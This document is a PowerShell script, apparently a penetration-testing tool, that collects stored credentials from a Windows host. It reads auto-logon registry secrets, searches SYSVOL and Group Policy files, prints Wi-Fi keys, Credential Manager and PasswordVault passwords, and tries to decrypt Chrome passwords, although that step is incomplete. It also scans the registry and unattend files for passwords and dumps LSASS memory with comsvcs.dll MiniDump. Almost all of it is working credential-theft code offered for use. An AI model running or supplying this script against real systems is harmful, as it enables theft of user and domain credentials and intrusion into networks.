<#
  PowerShell script to extract credentials from local Windows hosts without downloading external tools. 
  Searches common Windows locations for stored credentials, also can dump LSASS process to you current working directory
#>

#Search registry for auto-logon credentials
Write-Host "Searching for Auto-Logon credentials"
gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' | select "Default*"

#Check for LSASS WDigest caching
Write-Host "Searching for LSASS WDigest cached credentials"
(gp registry::HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest).UseLogonCredential

#Credentials in SYSVOL and Group Policy Preferences (GPP)
$Have_AD = Read-Host "Does target have AD & GPO (y/n)? "
if ($Have_AD -eq "y") {
$domain = Read-Host "What is the client's Fully Qualified domain name (ex. burgertown.domain.local): "
Write-Host "Searching for credentials in SYSVOL & GPP"
Push-Location \\$domain\sysvol
gci * -Include *.xml,*.txt,*.bat,*.ps1,*.psm,*.psd -Recurse -EA SilentlyContinue | select-string password
Pop-Location
}
else { Write-host "Target does not have AD or GPO, skipping over SYSVOL & GPP search" }

#Get stored Wi-Fi passwords from Wireless Profiles
Write-Host "Searching for Wireless Profiles for Wi-Fi passwords"
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize

#Get stored passwords from Windows PasswordVault
Write-host "Searching Windows PasswordVault for credentials"
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }

#Get stored passwords from Windows Credential Manager
Write-Host "Searching Windows Credential Manager for credentials"
Install-Module -Name CredentialManager	
Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine ":" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }

#Dump passwords from Google Chrome browser
Write-Host "Searching Google Chrome objects for passwords"
[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($datarow.password_value,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))

#Search for SNMP community string in registry
Write-Host "Searching registry for SNMP community strings"
gci HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse -EA SilentlyContinue

#Search for string pattern in registry
Write-Host "Searching registry for credentials...may take a while"
$pattern = "password"
$hives = "HKEY_CLASSES_ROOT","HKEY_CURRENT_USER","HKEY_LOCAL_MACHINE","HKEY_USERS","HKEY_CURRENT_CONFIG"
foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | sls "$pattern" }
foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match "$pattern") { $_.PsPath; $_ | out-string -stream | sls "$pattern" }}}

#Find credentials in Sysprep or Unattend files
$answer= Read-Host -Prompt "Would you like to search C:\ for sysprep and unattend files, could take a while (y/n)? "
if($answer -eq "y") 
{Write-Host "Searching sysprep and unattend files for credentials"
gci c:\ -Include *sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt -File -Recurse -EA SilentlyContinue}
else { Write-host "Not searching for sysprep and unattend files" }

$answer= Read-Host -Prompt "Would you like to dump LSASS (y/n)? "
if($answer -eq "y") 
{
Write-Host "Dumping LSASS to current working directory"
$ID = Get-Process -Name LSASS
rundll32.exe comsvcs.dll, MiniDump $id.Id lsass.dmp full
}
else {Write-Host "NOT dumping LSASS"
}
